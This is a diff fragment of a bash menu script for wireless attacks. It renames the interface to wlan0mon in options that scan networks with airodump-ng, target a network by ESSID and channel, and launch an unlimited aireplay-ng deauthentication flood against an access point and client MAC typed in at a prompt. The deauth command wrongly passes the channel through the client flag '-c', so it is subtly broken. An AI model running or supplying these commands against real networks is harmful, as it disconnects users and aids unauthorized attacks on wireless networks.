@@ -28,14 +28,14 @@ while true; do
       ;;
     2)
       # Mon mode off
-      sudo airmon-ng stop wlan0
+      sudo airmon-ng stop wlan0mon
       /etc/init.d/networking restart
 
       read -p "Enter to return to the menu"
       ;;
     3)
       # Scan with interface
-      sudo airodump-ng wlan0
+      sudo airodump-ng wlan0mon
 
       read -p "Enter to return to the menu"
       ;;
@@ -44,7 +44,7 @@ while true; do
       read -p "CHANNEL OF TARGET: " channel
       read -p "ACCES POINT TARGET MAC: " mac_ap
       read -p "CLIENT TARGET MAC: " mac_cliente
-      aireplay-ng --deauth 0 -c $channel -a $mac_ap -c $mac_cliente wlan0
+      aireplay-ng --deauth 0 -c $channel -a $mac_ap -c $mac_cliente wlan0mon
 
       read -p "Enter to return to the menu"
       ;;
@@ -64,7 +64,7 @@ while true; do
       # Scaning Network Target
       read -p "CHANNEL OF TARGET: " channel
       read -p "EESID OF TARGET MAC: " essid
-      airodump-ng -c $channel --essid $essid wlan0
+      airodump-ng -c $channel --essid $essid wlan0mon
       
       read -p "Enter to return to the menu"
       ;;
